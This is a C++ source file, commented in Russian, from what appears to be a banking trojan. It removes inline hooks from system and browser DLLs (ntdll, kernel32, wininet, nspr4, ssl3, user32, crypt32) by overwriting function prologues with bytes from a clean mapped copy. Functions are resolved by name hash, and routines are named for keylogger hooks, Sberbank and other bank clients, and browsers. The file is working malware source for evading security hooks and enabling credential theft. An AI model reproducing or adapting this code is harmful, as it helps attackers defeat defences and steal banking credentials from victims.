#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"
#include "DllLoader.h"


PIMAGE_NT_HEADERS Unhook_GetNTHeaders(LPVOID Image)
{
	// Получаем заголовок образа
	if (!Image)
		return NULL;
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Image;
	if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS NTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)Image + DosHeader->e_lfanew);
	if (NTHeaders->Signature != IMAGE_NT_SIGNATURE)
		NTHeaders = NULL;

	return NTHeaders;
}
//---------------------------------------------------------------------------

bool CanRestoreFunc(const char* Name, PDWORD ProcNameHashes)
{
	// Функция проверет необходимость восстановления нужной функции
	DWORD Hash = STRA::Hash(Name);
	while (*ProcNameHashes)
	{
		if (*ProcNameHashes == Hash)
			return true;
		ProcNameHashes++;
	}
	return false;
}
//---------------------------------------------------------------------------


void WINAPI UnhookFunc(LPBYTE OriginalImage, LPBYTE CurrentImage, PDWORD ProcNameHashes)
{
	const static DWORD RestoreSize = 10;
	// Получаем заголовок dll
	PIMAGE_NT_HEADERS OriginalHeaders = Unhook_GetNTHeaders(OriginalImage);
	PIMAGE_NT_HEADERS CurrentHeaders  = Unhook_GetNTHeaders(CurrentImage);

	// Получаем директорию  информацией о таблице экспорта
	PIMAGE_DATA_DIRECTORY OriginalDirectory = &OriginalHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_DATA_DIRECTORY CurrentDirectory = &CurrentHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// Получаем таблицу экпорта
	PIMAGE_EXPORT_DIRECTORY OriginalExports = (PIMAGE_EXPORT_DIRECTORY)(OriginalImage + OriginalDirectory->VirtualAddress);
	PIMAGE_EXPORT_DIRECTORY CurrentExports  = (PIMAGE_EXPORT_DIRECTORY)(CurrentImage + CurrentDirectory->VirtualAddress);

    // Перебираем все функции и определяем необходимоть вотановления
	PDWORD NameRef = (PDWORD)(OriginalImage + OriginalExports->AddressOfNames);
	PWORD  Ordinal = (PWORD)(OriginalImage + OriginalExports->AddressOfNameOrdinals);
	PWORD  Ordinal2 = (PWORD)(CurrentImage + CurrentExports->AddressOfNameOrdinals);

	for (DWORD i = 0; i < OriginalExports->NumberOfNames; i++, NameRef++, Ordinal++, Ordinal2++)
	{
		PCHAR Name = (PCHAR)(OriginalImage + *NameRef);
		if (!CanRestoreFunc(Name, ProcNameHashes)) continue;
		// Получаем указатели на функции в обоих dll
        WORD idx = *Ordinal;
		LPBYTE OriginalFunc = (OriginalImage + *(PDWORD)(OriginalImage + OriginalExports->AddressOfFunctions + (idx*4)));
		LPBYTE CurrentFunc = (CurrentImage + *(PDWORD)(CurrentImage + CurrentExports->AddressOfFunctions + (idx*4)));

		if (m_memcmp(OriginalFunc, CurrentFunc, RestoreSize) != 0)
		{
			// Функции отличаются, востанавливаем код.
			DWORD OldProtect = 0;
			if ((BOOL)pVirtualProtect((LPVOID)CurrentFunc, RestoreSize, PAGE_EXECUTE_READWRITE, &OldProtect ) )
			{
				m_memcpy(CurrentFunc, OriginalFunc, RestoreSize);
				pVirtualProtect(CurrentFunc, RestoreSize, OldProtect, &OldProtect);
			}
        }
	}
}
//---------------------------------------------------------------------------

void WINAPI UnhookFunc(LPVOID OriginalImage, const char *Dll, PDWORD NameHashes)
{
	// Функция снимает хуки с указанного массива хэщей функций

	// Получаем текущий образ
	LPVOID CurrentImage = (LPVOID)GetDllBase(STRA::Hash(Dll));

	PIMAGE_NT_HEADERS Headers = Unhook_GetNTHeaders(OriginalImage);

	if (!Headers || !CurrentImage || !NameHashes)
		return;

	// Загружаем dlld промежуточный буфер
	LPVOID OriginalDLL = MemAlloc(Headers->OptionalHeader.SizeOfImage);


	if (OriginalDLL)
	{
		//***************************************************
		//  Для корректного снятия хуков нам необходимо
		//  привести образ оригинальной dll. с этой целью
		//  мы загружаем ораз в память, копируем екции и
		//  правим релоки
		//  Релоки правим таким образом чтобы получились
		//  адреса как в целевой библиотеке
		//***************************************************

		// Копируем заголовки
		DWORD CopySize = ((PIMAGE_DOS_HEADER)OriginalImage)->e_lfanew + Headers->OptionalHeader.SizeOfHeaders;
		m_memcpy(OriginalDLL, OriginalImage, CopySize);

		PIMAGE_NT_HEADERS NewHeaders = Unhook_GetNTHeaders(OriginalDLL);
		NewHeaders->OptionalHeader.ImageBase = (DWORD)OriginalDLL;

		// Копируем секции
		CopySections((LPBYTE)OriginalImage, (LPBYTE)OriginalDLL, Headers, NewHeaders);

		// Обрабатываем релоки
		DWORD Delta = (DWORD)CurrentImage - Headers->OptionalHeader.ImageBase;
		ProcessRelocation((LPBYTE)OriginalDLL, NewHeaders, Delta);


		// Приводим оригинальный образ к настройкам загруженного образа
		UnhookFunc((LPBYTE)OriginalDLL,  (LPBYTE)CurrentImage, NameHashes);

        MemFree(OriginalDLL);
    }

}
//---------------------------------------------------------------------------


// Копируем dll во временный файл
char* CopyDllToTemp( const char* nameDll, char* nameTemp )
{
	HMODULE module = (HMODULE)pGetModuleHandleA(nameDll);
	if( module )
	{
		char pathDll[MAX_PATH];
		pathDll[0] = 0;
		int len = (int)pGetModuleFileNameA( module, pathDll, sizeof(pathDll) );
		if( len > 0 )
		{
			File::GetTempName(nameTemp);
			if( pCopyFileA( pathDll, nameTemp, FALSE ) )
			{
				return nameTemp;
			}
        }
    }
    return 0;
}
//---------------------------------------------------------------------------



void WINAPI RestoreFuncs(TDllId Dll, DWORD *dwFuncMass)
{
	PCHAR DllName  = GetDLLName(Dll);
	char TempDll[MAX_PATH];
	if( CopyDllToTemp( DllName, TempDll ) == 0 )
		return;

 	HANDLE hFile = pCreateFileA( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
	
	HANDLE	hMapping = NULL;
	LPVOID	hMap     = NULL;
	
	if ( hFile != INVALID_HANDLE_VALUE ) 
	{
		hMapping = pCreateFileMappingA( hFile, 0, PAGE_READONLY, 0, 0, 0 );

		if ( hMapping != INVALID_HANDLE_VALUE )
		{
			hMap = pMapViewOfFile( hMapping, FILE_MAP_READ, 0, 0, 0 );

			if ( hMap )
			{
				UnhookFunc(hMap, DllName, dwFuncMass);
				pUnmapViewOfFile( hMap );
			}

			pCloseHandle( hMapping );
		}
	}


	pCloseHandle( hFile );

//	pDeleteFileA(TempDll);
}


/************************************************************************/
//* Восстанавливает неэкспорируемую функцию по её VA                    */
void WINAPI UnhookFunc2( LPVOID hMap, const char *Dll, DWORD dwProcVA )
{
	BYTE entryPointBytes[10];
	BYTE originalBytes[10];

	DWORD dwImageBase = (DWORD)GetDllBase( STRA::Hash(Dll));

	if ( !dwImageBase )
		{
			return;
		}

	ULONG entryVA = dwImageBase + dwProcVA;
	ULONG entryMA =	( (ULONG)hMap  + dwProcVA );

	m_memcpy( originalBytes, (PVOID)entryMA, 10 );
	m_memcpy( entryPointBytes, (LPVOID)entryVA, 10 );


	if ( m_memcmp( entryPointBytes, originalBytes, 10 ) )
		{
			DWORD dwOldProtect;

			if ( (BOOL)pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, PAGE_EXECUTE_READWRITE, &dwOldProtect ) )
				{
					m_memcpy( (LPVOID)entryVA, (LPCVOID)originalBytes, 10 );
					pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, dwOldProtect, &dwOldProtect );
				}
		}

	return;
}


/************************************************************************/
/* Восстанавливает вектор неэкспортируемых функций по их VA             */
void WINAPI RestoreFuncs2( const char *Dll, DWORD *dwFuncMass)
{
	char TempDll[MAX_PATH];
	if( CopyDllToTemp( Dll, TempDll ) )
		return;

	HANDLE hFile = pCreateFileA( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
	
	HANDLE	hMapping = NULL;
	LPVOID	hMap     = NULL;
	
	if ( hFile != INVALID_HANDLE_VALUE ) 
	{
		hMapping = pCreateFileMappingA( hFile, 0, PAGE_READONLY | SEC_IMAGE, 0, 0, 0 );

		if ( hMapping != INVALID_HANDLE_VALUE )
		{
			hMap = pMapViewOfFile( hMapping, FILE_MAP_READ, 0, 0, 0 );

			if ( hMap )
			{
				for ( DWORD i = 0; dwFuncMass[i] != 0; i++ )
				{
					UnhookFunc2( hMap, Dll, dwFuncMass[i] );
				}
			}
		}
	}

	pUnmapViewOfFile( hMap );

	pCloseHandle( hMapping );
	pCloseHandle( hFile );

	pDeleteFileA(TempDll);
}


//WCHAR ieframe_dll[]  = {'i','e','f','r','a','m','e','.','d','l','l',0};
//WCHAR kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
//WCHAR user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
//WCHAR ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
//WCHAR ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
//WCHAR wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
//WCHAR nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
//WCHAR ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
////opera
//WCHAR opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
//WCHAR gdi_dll[]		 = {'g','d','i','3','2','.','d','l','l',0};
//WCHAR winspool_drv[] = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
//WCHAR commdlg32_dll[]= {'c','o','m','d','l','g','3','2','.','d','l','l',0};
////for sound
//WCHAR winmm_dll[]= {'w','i','n','m','m','.','d','l','l',0};
//WCHAR advapi32_dll[]  = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
//WCHAR odbc32_dll[] = {'o','d','b','c','3','2','.','d','l','l',0};
//WCHAR crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};



//commdlg
#define C_GETSAVEFILENAMEA	0x8FD473C8
#define C_GETOPENFILENAMEA	0xE16570D

//winspool
#define C_ENUMPRINTERSA			0x9804C3C0

//gdi32
#define C_TEXTOUTA			0x4954ED86
#define C_TEXTOUTW			0x4954ED90
#define C_EXTTEXTOUTA		0x3D54FCFA
#define C_EXTTEXTOUTW		0x3D54FCEC
//ntdll
#define C_ZWSETCONTEXTTHREAD			0x62E2FE6F
#define C_ZWGETCONTEXTTHREAD			0x62E2D66F
#define C_ZWMAPVIEWOFSECTION			0x594D9A3C
#define C_ZWUNMAPVIEWOFSECTION			0x9ED4D161
#define C_ZWALLOCATEVIRTUALMEMORY		0x594AA9E4
#define C_ZWWRITEVIRTUALMEMORY			0xEEE7AF23
#define C_ZWPROTECTVIRTUALMEMORY		0x3836C63E		
#define C_ZWCREATETHREAD				0xB8C89AF2
#define C_ZWOPENPROCESS					0x9C0AC99D
#define C_ZWOPENTHREAD					0x7E9997A5
#define C_ZWQUEUEAPCTHREAD				0xC0E4F6EE
#define C_ZWTERMINATEPROCESS			0xB318A842			
#define C_ZWTERMINATETHREAD				0xC0C7B366
#define C_ZWRESUMETHREAD				0xACF8BF39
#define C_ZWQUERYDIRECTORYFILE			0x5F8B35D6
#define C_ZWCREATEPROCESS				0xB48C627E
#define C_ZWCREATEPROCESSEX				0x189F8FDB
#define C_ZWCREATEFILE					0xAA1AAC22
#define C_ZWDEVICEIOCONTROLFILE			0x385D3092
#define C_ZWCLOSE						0x3D9A9259
#define C_ZWSETINFORMATIONPROCESS		0xCA2BF652

//kernel32
#define C_CREATEREMOTETHREAD			0xE61874B3
#define C_WRITEPROCESSMEMORY			0xBEA0BF35
#define C_VIRTUALPROTECTEX				0x9BD6888F		
#define C_VIRTUALALLOCEX				0x9ABFB8A6
#define C_GETTHREADCONTEXT				0xAA1DE02F
#define C_SETTHREADCONTEXT				0xAA1DC82F			
#define C_CREATEPROCESSA				0x46318AC7				
#define C_CREATEPROCESSW				0x46318AD1	
#define C_CREATEPROCESSINTERNALA		0xE24394E4
#define C_CREATEPROCESSINTERNALW		0xE24394F2
#define C_CREATEFILEA					0x8F8F114				
#define C_CREATEFILEW					0x8F8F102
#define C_COPYFILEA						0x2EE4F10D				
#define C_COPYFILEW						0x2EE4F11B
#define C_COPYFILEEXW					0x3C4277EE				
#define C_LOADLIBRARYW					0xC8AC8030
#define C_LOADLIBRARYEXW				0x20088E7C
#define C_GETCOMMANDLINEA				0xFB0730C
#define C_GETCOMMANDLINEW				0xFB0731A

// advapi
#define C_REGQUERYVALUEEXA				0x1802E7C8

//ws2_32
#define C_CONNECT						0xEDD8FE8A
#define C_SEND							0xE797764
#define C_RECV							0xE5971F6
#define C_GETHOSTBYNAME					0xF44318C6

//wininet
#define C_INTERNETOPENA					0x8593DD7
#define C_INTERNETOPENW					0x8593DC1
#define C_INTERNETCONNECTA				0xBE618D3E
#define C_INTERNETCONNECTW				0xBE618D28
#define C_INTERNETOPENURLA				0xB87DBD66
#define C_INTERNETOPENURLW				0xB87DBD70
#define C_HTTPOPENREQUESTA				0x1510002F
#define C_HTTPOPENREQUESTW				0x15100039		
#define C_HTTPSENDREQUESTA				0x9F13856A		
#define C_HTTPSENDREQUESTW				0x9F13857C	
#define C_HTTPSENDREQUESTEXA			0xE15B9B85
#define C_HTTPSENDREQUESTEXW			0xE15B9B93
#define C_INTERNETREADFILE				0x1A212962			
#define C_INTERNETREADFILEEXA			0x2C523864
#define C_INTERNETREADFILEEXW			0x2C523872
#define C_INTERNETQUERYDATAVAILABLE		0x7EDEC584
#define C_INTERNETCLOSEHANDLE			0x7314FB0C
#define C_HTTPADDREQUESTHEADERSA		0xB5901061
#define C_HTTPADDREQUESTHEADERSW		0xB5901077
#define C_INTERNETWRITEFILE				0x205BD56A
#define C_HTTPQUERYINFOA				0x2F5CE027
#define C_HTTPQUERYINFOW				0x2F5CE031


//nspr4
#define C_PRWRITE						0x7EFB3098
#define C_PRREAD						0xFA583271
#define C_PRCLOSE						0x3D3AB319
#define C_PRCONNECT						0xBF667EA2
#define C_PROPENTCPSOCKET				0xBF667EA2


//ssl3
#define C_SSLIMPORTFDHASH				0xA1C4E024

//user32

#define C_TRANSLATEMESSAGE				0xC45D9631
#define C_CREATEWINDOWEXW				0xBF7EFB5A
#define C_SHOWWINDOW					0x7506E960
#define C_GETMESSAGEPOS					0x9D2F45DB
#define C_DIALOGBOX_PARAMW				0x929A0EB1
#define C_WINDOWFROMPOINT				0x85F352BD
#define C_SETWINDOWPOS					0xA92DF5AF

#define C_DRAWTEXTA						0x85BBDFC
#define C_DRAWTEXTW						0x85BBDEA
#define C_DRAWTEXTEXA					0xEF7E3E57
#define C_DRAWTEXTEXW					0xEF7E3E41
#define C_BeginPaint					0x69F5D020
#define C_EndPaint						0xCB1CC51
#define C_GetDCEx						0x4891FDD7

#define C_DispatchMessageA				0x4BAED1C8
#define C_DispatchMessageW				0x4BAED1DE
#define C_SetFocus						0x6D5F6D57
#define C_PeekMessageA					0xD7A87C2C
#define C_PeekMessageW					0xD7A87C3A
#define C_SetWindowTextW				0x3C29101C
#define C_GetClipboardData				0x8E7AE818


//кейлогеровские хуки
#define C_PEEKMESSAGEA			0xD7A87C2C
#define C_GETMESSAGEA			0xC8A274AC
#define C_PEEKMESSAGEW			0xD7A87C3A
#define C_GETMESSAGEW			0xC8A274BA

#define C_DispatchMessageA		0x4BAED1C8
#define C_DispatchMessageW		0x4BAED1DE
#define C_SetWindowTextW		0x3C29101C
#define C_SETFOCUS				0x6D5F6D57

//winmm_dll
#define C_WAVEOUTWRITE			0x1BCB55BB

//odbc_dll
#define C_SQLDriverConnectA		0x3941DBB7
#define C_SQLPrepareA			0xC09D6D06

// crypt32_dll
#define C_PFXImportCertStore	0x3A1B7F5D



void UnhookDlls()
{
	DWORD dwNtdll[]	  = { C_ZWSETCONTEXTTHREAD, C_ZWGETCONTEXTTHREAD,
						  C_ZWUNMAPVIEWOFSECTION, C_ZWMAPVIEWOFSECTION,
						  C_ZWALLOCATEVIRTUALMEMORY, C_ZWWRITEVIRTUALMEMORY,
						  C_ZWPROTECTVIRTUALMEMORY, C_ZWCREATETHREAD, 
						  C_ZWOPENPROCESS, C_ZWOPENTHREAD,
						  C_ZWQUEUEAPCTHREAD, C_ZWTERMINATEPROCESS, 
						  C_ZWTERMINATETHREAD, C_ZWRESUMETHREAD,
						  C_ZWQUERYDIRECTORYFILE, C_ZWCREATEPROCESS,
						  C_ZWCREATEPROCESSEX, C_ZWCREATEFILE,
						  C_ZWDEVICEIOCONTROLFILE, C_ZWCLOSE,
						  C_ZWSETINFORMATIONPROCESS, 0 };

	DWORD dwKernel[]  = { C_CREATEREMOTETHREAD, C_WRITEPROCESSMEMORY,
						  C_VIRTUALPROTECTEX, C_VIRTUALALLOCEX,
						  C_SETTHREADCONTEXT, C_CREATEPROCESSA,
						  C_CREATEPROCESSINTERNALA, C_CREATEPROCESSINTERNALW,
						  C_CREATEFILEA, C_CREATEFILEW, 
						  C_COPYFILEA, C_COPYFILEW, C_COPYFILEEXW, 
						  C_LOADLIBRARYW, C_LOADLIBRARYEXW, 
						  C_GETCOMMANDLINEA, C_GETCOMMANDLINEW, 
						  0 };

	DWORD dwAdvapi[] = { C_REGQUERYVALUEEXA, 
						  0 };

	DWORD dwUser32[] = {  C_TRANSLATEMESSAGE,C_CREATEWINDOWEXW, C_SHOWWINDOW, C_GETMESSAGEPOS,
						  C_DIALOGBOX_PARAMW,C_WINDOWFROMPOINT,C_SETWINDOWPOS,C_DRAWTEXTA,
						  C_DRAWTEXTW,C_DRAWTEXTEXA,C_DRAWTEXTEXW,C_BeginPaint,C_EndPaint,
						  C_GetDCEx,C_DispatchMessageA,C_DispatchMessageW,C_SetFocus,
						  C_PeekMessageA,C_PeekMessageW,C_SetWindowTextW,C_GetClipboardData, 
						  0 };

	DWORD dwWinsock[] = { C_CONNECT, C_SEND, C_RECV, C_GETHOSTBYNAME, 0 };

	DWORD dwOdbc[]    = { C_SQLDriverConnectA, C_SQLPrepareA, 0 };

	DWORD dwCrypt32[] = { C_PFXImportCertStore, 0 };

	DWORD dwNspr4[]	= { C_PRWRITE, C_PRREAD,
						C_PRCLOSE, C_PRCONNECT,
						C_PROPENTCPSOCKET, 0 };

	DWORD dwSsl3[]	= { C_SSLIMPORTFDHASH, 0 };

	DWORD dwWininet[] = { C_INTERNETOPENA, C_INTERNETOPENW,
						  C_INTERNETCONNECTA, C_INTERNETCONNECTW,
						  C_INTERNETOPENURLA, C_INTERNETOPENURLW,
						  C_HTTPOPENREQUESTA, C_HTTPOPENREQUESTW,
						  C_HTTPSENDREQUESTA, C_HTTPSENDREQUESTW,
						  C_HTTPSENDREQUESTEXA, C_HTTPSENDREQUESTEXW,
						  C_INTERNETREADFILE, C_INTERNETREADFILEEXA,
						  C_INTERNETREADFILEEXW, C_INTERNETQUERYDATAVAILABLE,
						  C_HTTPADDREQUESTHEADERSW, C_HTTPADDREQUESTHEADERSA,
						  C_INTERNETCLOSEHANDLE, 
						  C_HTTPADDREQUESTHEADERSA, C_HTTPADDREQUESTHEADERSW,
						  C_INTERNETWRITEFILE, 
						  C_HTTPQUERYINFOA, C_HTTPQUERYINFOW,
						  0 };
	
	DWORD dwWinmm[] = {C_WAVEOUTWRITE, 0 };

	DWORD dwGdi32[] ={ C_TEXTOUTA, C_TEXTOUTW,
					   C_EXTTEXTOUTA,C_EXTTEXTOUTW, 0 };

	DWORD dwWinspool[] ={ C_ENUMPRINTERSA, 0 };

	DWORD dwCommDlg[] ={ C_GETSAVEFILENAMEA, C_GETOPENFILENAMEA, 0 };


	RestoreFuncs( DLL_NTDLL,     dwNtdll);
	RestoreFuncs( DLL_KERNEL32,  dwKernel);
	RestoreFuncs( DLL_WINSOCK,   dwWinsock);
	RestoreFuncs( DLL_ADVAPI32,  dwAdvapi);
	RestoreFuncs( DLL_USER32,    dwUser32);
	RestoreFuncs( DLL_ODBC32,    dwOdbc);
	RestoreFuncs( DLL_CRYPT32,   dwCrypt32);
	RestoreFuncs( DLL_SSL3,      dwSsl3);
	RestoreFuncs( DLL_WININET,   dwWininet);
	RestoreFuncs( DLL_WINMM,     dwWinmm);
	RestoreFuncs( DLL_GDI,       dwGdi32);
	RestoreFuncs( DLL_WINSPOOL,  dwWinspool);
	RestoreFuncs( DLL_COMMDLG32, dwCommDlg);
	RestoreFuncs( DLL_NSPR4,      dwNspr4);


//	RestoreFuncs( ntdll_dll,     dwNtdll,   true );
//	RestoreFuncs( kernel32_dll,  dwKernel,  true );
//	RestoreFuncs( ws2_32_dll,    dwWinsock, true );
//	RestoreFuncs( advapi32_dll,  dwAdvapi,  true );
//	RestoreFuncs( user32_dll,    dwUser32,  true );
//	RestoreFuncs( odbc32_dll,    dwOdbc,    true );
//	RestoreFuncs( crypt32_dll,   dwCrypt32, true );
//	RestoreFuncs( nspr4_dll,     dwNspr4,   false);
//	RestoreFuncs( ssl3_dll,      dwSsl3,    false);
//	RestoreFuncs( wininet_dll,   dwWininet, true );
//	RestoreFuncs( winmm_dll,     dwWinmm,   true );
//	RestoreFuncs( gdi_dll,       dwGdi32,   true );
//	RestoreFuncs( winspool_drv,  dwWinspool,true );
//	RestoreFuncs( commdlg32_dll, dwCommDlg, true );
}


void UnhookIE()
{
	DWORD dwWininet[] = { C_INTERNETOPENA, C_INTERNETOPENW,
						  C_INTERNETCONNECTA, C_INTERNETCONNECTW,
						  C_INTERNETOPENURLA, C_INTERNETOPENURLW,
						  C_HTTPOPENREQUESTA, C_HTTPOPENREQUESTW,
						  C_HTTPSENDREQUESTA, C_HTTPSENDREQUESTW,
						  C_HTTPSENDREQUESTEXA, C_HTTPSENDREQUESTEXW,
						  C_INTERNETREADFILE, C_INTERNETREADFILEEXA,
						  C_INTERNETREADFILEEXW, C_INTERNETQUERYDATAVAILABLE,
						  C_HTTPADDREQUESTHEADERSW, C_HTTPADDREQUESTHEADERSA,
						  C_INTERNETCLOSEHANDLE, 0 };

	RestoreFuncs(DLL_WININET, dwWininet);

	/////////////////////////////
	DWORD dwUser32[] = {C_SHOWWINDOW, 0xBF7EFB4C, 0 };
	RestoreFuncs(DLL_USER32, dwUser32);
	/////////////////////////////
	DWORD dwWinmm[] = {C_WAVEOUTWRITE, 0 };
	RestoreFuncs(DLL_WINMM, dwWinmm);
}


void UnhookFF()
{
	DWORD dwNspr4[]	= { C_PRWRITE, C_PRREAD,
						C_PRCLOSE, C_PRCONNECT, 0 };

	DWORD dwSsl3[]	= { C_SSLIMPORTFDHASH, 0 };

	RestoreFuncs(DLL_NSPR4,  dwNspr4);
	RestoreFuncs( DLL_SSL3,  dwSsl3);

	return;
}


void UnhookUser32()
{
	DWORD dwUser32[] = { C_TRANSLATEMESSAGE, 0 };
	RestoreFuncs(DLL_USER32, dwUser32);
}

/// Функции добавленные при добавлении RuBnk
//#ifdef RuBnkH
void UnhookTranslateMessage()
{
	DWORD dwUser32[] = { C_TRANSLATEMESSAGE, 0 };
	RestoreFuncs(DLL_USER32, dwUser32);
}

void UnhookCreateFileW()
{
	DWORD dwKernel[]  = { C_CREATEFILEW, 0 };	
	RestoreFuncs(DLL_KERNEL32,  dwKernel);
}


void UnhookKernel32Functions(DWORD* Functions)
{
   RestoreFuncs(DLL_KERNEL32,  Functions);
}


void UnhookIBancShowCreate()
{
	DWORD dwUser32[] = {C_CREATEWINDOWEXW, C_SHOWWINDOW, 0 };
	RestoreFuncs(DLL_USER32, dwUser32);

	return;
}
void UnhookShowWindow()
{
	DWORD dwUser32[] = {C_SHOWWINDOW, 0 };
	RestoreFuncs( DLL_USER32, dwUser32 );
	return;
}

//#endif
//удаление кукисов в ие
void UnhookCookie()
{
	DWORD dwUser32[] ={ C_DIALOGBOX_PARAMW, 0 };
	RestoreFuncs(DLL_USER32,  dwUser32);

	return;
}

/************************************************************************/
void UnhookOpera(DWORD dwAddr)
{
	DWORD dwOpera[] ={ dwAddr, 0 };

	// Opera.dll слинкована динамически, чтобы всё работало
	// нужно подгрузить её в процесс раньше, чем браузер
	pLoadLibraryW(GetDLLName(DLL_OPERA));

	RestoreFuncs2(GetDLLName(DLL_OPERA), dwOpera);
	return;
}

void UnhookJava()
{
 DWORD dwUser32[] ={ C_SHOWWINDOW, C_GETMESSAGEPOS, C_WINDOWFROMPOINT, 0 };
 RestoreFuncs(DLL_USER32, dwUser32);

 return;
}

void UnhookGetMessagePos()
{
 DWORD dwUser32[] ={ C_GETMESSAGEPOS, 0 };
 RestoreFuncs( DLL_USER32, dwUser32);
}
/************************************************************************/
//кейлогеровские хуки
void UnhookKeyLogger()
{
	DWORD dwUser32[] ={ C_PEEKMESSAGEA, C_GETMESSAGEA, C_PEEKMESSAGEW, C_GETMESSAGEW, 0 };
	RestoreFuncs( DLL_USER32,  dwUser32);
}
/************************************************************************/
//хуки для Sber
void UnhookSber()
{
	DWORD dwUser32[] ={ C_SHOWWINDOW, C_TRANSLATEMESSAGE,
											C_DRAWTEXTA, C_DRAWTEXTW,
											C_DRAWTEXTEXA, C_DRAWTEXTEXW, 0 };
	RestoreFuncs( DLL_USER32,  dwUser32);

	DWORD dwGdi32[] ={ C_TEXTOUTA, C_TEXTOUTW,
										 C_EXTTEXTOUTA,	C_EXTTEXTOUTW, 0 };
	RestoreFuncs(DLL_GDI,  dwGdi32 );

	DWORD dwWinspool[] ={ C_ENUMPRINTERSA, 0 };
	RestoreFuncs(DLL_WINSPOOL, dwWinspool);

	DWORD dwCommDlg[] ={ C_GETSAVEFILENAMEA, C_GETOPENFILENAMEA, 0 };
	RestoreFuncs(DLL_COMMDLG32, dwCommDlg);
}

void UnhookSetFocus()
{
	DWORD dwUser32[] ={ C_SETFOCUS, C_DispatchMessageA, C_DispatchMessageW, 0 };
	RestoreFuncs( DLL_USER32,  dwUser32 );
}


void UnhookCreateFile()
{
	DWORD dwKernel[]  = { C_CREATEFILEA, C_CREATEFILEW, 0 };	
	RestoreFuncs(DLL_KERNEL32,  dwKernel );
	return;
}

void UnhookBeginEndPaint()
{
	DWORD dwUser32[] ={ C_BeginPaint, C_EndPaint, C_GetDCEx, 0 };
	RestoreFuncs(DLL_USER32,  dwUser32);
}
